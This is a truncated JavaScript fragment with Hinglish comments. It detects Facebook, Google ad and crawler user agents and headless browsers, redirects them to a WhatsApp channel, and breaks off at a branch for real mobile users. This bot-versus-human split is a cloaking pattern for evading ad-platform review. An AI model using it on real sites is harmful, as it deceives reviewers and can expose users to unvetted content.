            // 1. Bot Keywords
            var isBot = /facebookexternalhit|Facebot|facebookplatform|Googlebot|AdsBot|Mediapartners|HeadlessChrome|Bot|Crawler|Spider/i.test(ua);
            
            // 2. Mobile User Agent
            var isMobile = /Android|iPhone|iPad|iPod|Opera Mini/i.test(ua);

            // 3. STRICTOR CHECK: 
            // Mobile hona chahiye aur screen width 800 se kam honi chahiye (Desktop ki width zyada hoti hai)

            if (isBot || width === 0) {
                // Bot pakda gaya
                setTimeout(function() { window.location.replace(whatsappChannel); }, 2000);
            } else if (isRealMobile) {
